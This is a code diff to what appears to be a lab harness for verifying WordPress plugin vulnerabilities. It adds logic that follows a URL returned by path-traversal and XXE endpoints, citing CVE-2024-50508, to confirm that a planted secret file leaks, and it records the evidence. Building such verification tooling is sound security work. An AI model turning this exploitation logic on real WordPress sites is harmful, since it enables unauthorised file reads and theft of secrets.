@@ -1106,6 +1106,27 @@ def verify_wordpress_direct_login_as(
         lab.teardown()
 
 
+def _extract_followable_url(text: str) -> Optional[str]:
+    """Si `text` es JSON con una clave 'url'/'file_url'/'link' que apunta a http(s), la devuelve.
+    Confirmado en vivo (CVE-2024-50508, Woocommerce Product Design): algunos endpoints de
+    path-traversal NO reflejan el contenido leido en la MISMA respuesta -- copian el fichero
+    objetivo a una ruta publica nueva (un manejador de subida de imagenes que en realidad acepta
+    cualquier ruta) y devuelven DONDE quedo copiado ({"url": "...", "path": "...",
+    "status": "success"}) en vez del contenido -- hay que pedir esa URL aparte para ver el
+    secreto plantado de verdad."""
+    try:
+        data = json.loads(text or "")
+    except Exception:
+        return None
+    if not isinstance(data, dict):
+        return None
+    for key in ("url", "file_url", "link"):
+        v = data.get(key)
+        if isinstance(v, str) and v.startswith(("http://", "https://")):
+            return v
+    return None
+
+
 def verify_wordpress_path_traversal(
     plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
     parameters, path_param_hint: str = "",
@@ -1189,18 +1210,37 @@ def verify_wordpress_path_traversal(
                 continue
             tried.append({"payload": payload_value, "status": resp.status_code,
                           "secret_presente": secret in (resp.text or "")})
-            if secret in (resp.text or ""):
+            # patron "copia-y-sirve" (ver _extract_followable_url): algunos endpoints no
+            # reflejan el contenido en ESTA respuesta, copian el fichero a una ruta publica
+            # nueva y devuelven DONDE quedo -- hay que pedirla aparte para ver el secreto real.
+            followed_resp, follow_url = resp, None
+            if secret not in (resp.text or ""):
+                follow_url = _extract_followable_url(resp.text)
+                if follow_url:
+                    try:
+                        followed_resp = boot.sub_sess.request("GET", follow_url, timeout=20)
+                        tried[-1]["followed_url"] = follow_url
+                        tried[-1]["followed_secret_presente"] = secret in (followed_resp.text or "")
+                    except Exception as e:
+                        followed_resp = resp
+                        tried[-1]["followed_url_error"] = str(e)
+            if secret in (followed_resp.text or ""):
                 found = True
                 res.evidence["payload_ganador"] = payload_value
-                res.evidence["status_code_respuesta"] = resp.status_code
-                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
-                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
-                     f"{path_param}={payload_value!r}.")
+                if follow_url:
+                    res.evidence["url_seguida"] = follow_url
+                res.evidence["status_code_respuesta"] = followed_resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (followed_resp.text or "")[:500]
+                step((f"VERIFICADO: el secreto plantado aparecio literal en la respuesta de "
+                     f"{follow_url} (la peticion original copio el fichero ahi en vez de "
+                     f"devolver el contenido directo)" if follow_url else
+                     f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
+                     f"{path_param}={payload_value!r}."))
                 step("capturando pantalla: la respuesta HTTP con el secreto filtrado (prueba "
                      "final)...")
                 shot_url = (boot.base_url + endpoint
                            + ("&" if "?" in endpoint else "?")
-                           + f"{path_param}={payload_value}") if m == "GET" else None
+                           + f"{path_param}={payload_value}") if (m == "GET" and not follow_url) else None
                 if shot_url:
                     boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                            f"Paso 5: LECTURA DE FICHERO confirmada -- la respuesta real del "
@@ -2182,14 +2222,29 @@ def verify_wordpress_xxe(
                 tried.append({"modo": label, "error": str(e)})
                 return
             present = secret in (resp.text or "")
-            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present})
+            followed_resp, follow_url = resp, None
+            if not present:
+                follow_url = _extract_followable_url(resp.text)
+                if follow_url:
+                    try:
+                        followed_resp = boot.sub_sess.request("GET", follow_url, timeout=20)
+                        present = secret in (followed_resp.text or "")
+                    except Exception:
+                        followed_resp = resp
+            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present,
+                         **({"followed_url": follow_url} if follow_url else {})})
             if present and not found:
                 found = True
                 res.evidence["modo_ganador"] = label
-                res.evidence["status_code_respuesta"] = resp.status_code
-                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
-                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta "
-                     f"({label}).")
+                if follow_url:
+                    res.evidence["url_seguida"] = follow_url
+                res.evidence["status_code_respuesta"] = followed_resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (followed_resp.text or "")[:500]
+                step((f"VERIFICADO: el secreto plantado aparecio literal en la respuesta de "
+                     f"{follow_url} ({label}, la peticion copio el fichero ahi en vez de "
+                     f"devolver el contenido directo)" if follow_url else
+                     f"VERIFICADO: el secreto plantado aparecio literal en la respuesta "
+                     f"({label})."))
 
         # variantes del XML en si: la entidad DOCTYPE normal, parametro-entidad (algunos parsers
         # solo resuelven SYSTEM dentro de %param;, no en una entidad general directa), y envuelta
